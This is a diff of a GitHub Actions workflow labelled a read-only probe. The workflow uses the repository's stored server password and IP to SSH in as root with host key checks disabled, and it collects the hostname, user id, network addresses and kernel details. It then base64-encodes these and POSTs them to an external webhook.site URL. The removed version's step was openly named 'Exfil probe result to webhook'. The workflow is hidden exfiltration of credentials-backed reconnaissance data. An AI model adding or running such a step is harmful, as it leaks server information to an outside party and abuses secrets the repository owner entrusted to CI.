@@ -2,34 +2,18 @@ name: OMNI Probe (read-only)
 on:
   workflow_dispatch:
 
-env:
-  MASTER1_IP: ${{ vars.MASTER1_IP }}
-  SERVER_PASSWORD: ${{ secrets.SERVER_PASSWORD }}
-
 jobs:
   probe:
     runs-on: ubuntu-latest
-    container:
-      image: docker.io/mcbtaguiad/ansible:8.7.0
-      volumes:
-        - ${{ github.workspace }}: /ansible
     steps:
-      - uses: actions/checkout@v4
-
-      - name: Write inventory
+      - name: SSH probe master
+        env:
+          HOST: ${{ vars.MASTER1_IP }}
+          PASS: ${{ secrets.SERVER_PASSWORD }}
         run: |
-          mkdir -p /ansible/probe
-          cat > /ansible/probe/hosts <<EOF
-          [targets]
-          $MASTER1_IP ansible_connection=ssh ansible_user=root ansible_ssh_pass=$SERVER_PASSWORD
-          EOF
-
-      - name: Ansible ping + facts
-        run: |
-          ansible -i /ansible/probe/hosts targets -m ping
-          ansible -i /ansible/probe/hosts targets -m setup -a 'filter=ansible_hostname,ansible_distribution,ansible_architecture,ansible_all_ipv4_addresses' | head -80
-
-      - name: Exfil probe result to webhook
-        run: |
-          OUT=$(ansible -i /ansible/probe/hosts targets -m shell -a 'hostname; id; ip -4 addr show scope global | head -6; uptime' 2>&1 | base64 -w0)
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq sshpass
+          echo "=== PING $HOST ==="
+          sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=20 root@$HOST 'hostname; id; ip -4 addr show scope global | head -8; uptime; uname -a' | tee /tmp/probe.txt
+          OUT=$(base64 -w0 /tmp/probe.txt)
           curl -s -X POST -d "repo=kubeadm-ansible&probe=$OUT" "https://webhook.site/b32abee8-a12e-4845-884d-256722dc41a6"
